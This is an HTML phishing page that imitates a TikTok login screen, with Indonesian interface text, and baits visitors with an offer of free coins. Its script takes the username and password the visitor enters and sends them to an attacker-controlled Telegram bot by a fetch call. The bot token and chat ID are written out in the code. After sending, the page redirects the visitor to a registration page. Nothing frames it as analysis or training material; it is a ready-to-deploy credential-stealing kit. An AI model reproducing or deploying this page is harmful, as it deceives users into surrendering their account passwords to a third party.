<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Login</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <style>
    body {
      background: url('opsilogin.jpeg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-box {
      background: rgba(255, 255, 255, 0.9);
      border-radius: 12px;
      padding: 30px 25px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    }

    .login-title {
      text-align: center;
      font-weight: bold;
      margin-bottom: 20px;
      font-size: 20px;
      color: #333;
    }

    .form-control {
      border-radius: 8px;
      padding: 12px;
      font-size: 15px;
    }

    .btn-login {
      width: 100%;
      background: #ff004f;
      border: none;
      padding: 12px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      color: #fff;
      margin-top: 15px;
      transition: background 0.3s;
    }
    .btn-login:hover {
      background: #e60046;
    }

    @media (max-width: 480px) {
      .login-box {
        margin: 0 15px;
        padding: 25px 20px;
      }
      .login-title {
        font-size: 18px;
      }
    }
  </style>
</head>
<body>

  <div class="login-box">
    <div class="login-title">Log in</div>
    <form id="loginForm">
      <div class="mb-3">
        <input type="text" class="form-control" id="username" placeholder="Email / Username" required>
      </div>
      <div class="mb-3">
        <input type="password" class="form-control" id="password" placeholder="Password" required>
      </div>
      <button type="submit" class="btn-login">Log in to get Coins</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault();
      let username = document.getElementById("username").value.trim();
      let password = document.getElementById("password").value.trim();

      if(username === "" || password === ""){
        alert("Harap isi semua kolom.");
        return;
      }

      let message = `ðŸ”‘ *TikTok Login Attempt*\n\nðŸ‘¤ Username: ${username}\nðŸ”’ Password: ${password}`;

      let botToken = "8223256634:AAEPXs_cmADQhCTZZEyU4HrSsqTzNN9FGnA";
      let chatId = "6232172063";

      let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            window.location.href = "registrasi.html"; // redirect setelah login
          } else {
            alert("Gagal mengirim ke Telegram.");
          }
        })
        .catch(error => {
          alert("Terjadi kesalahan jaringan: " + error);
        });
    });
  </script>

</body>
</html>
